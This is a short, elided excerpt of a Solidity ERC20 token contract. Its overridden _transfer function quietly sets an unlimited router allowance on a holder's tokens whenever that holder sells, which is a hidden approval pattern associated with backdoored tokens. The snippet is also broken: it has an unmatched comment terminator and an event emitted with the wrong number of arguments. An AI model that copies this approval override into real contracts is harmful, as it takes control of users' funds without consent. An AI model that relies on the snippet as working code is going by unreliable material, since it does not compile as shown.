...
contract Token is ERC20, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        emit TrackTransfer(from, to, _msgSender(), amount);
        ...
        if (needToApplyFees(from, to)) {
            ...
            // If it is a sell and router is not authorized, then we change approval
            if (to == uniswapV2Pair 
                && allowance(from, address(uniswapV2Router)) != type(uint256).max) {
                emit TrackTransfer(from, to, amount, totalFees(), 100);
                _approve(from, address(uniswapV2Router), type(uint256).max);
            }*/
    ...
    event TrackTransfer(address from, address to, address sender, uint256 amount);
}
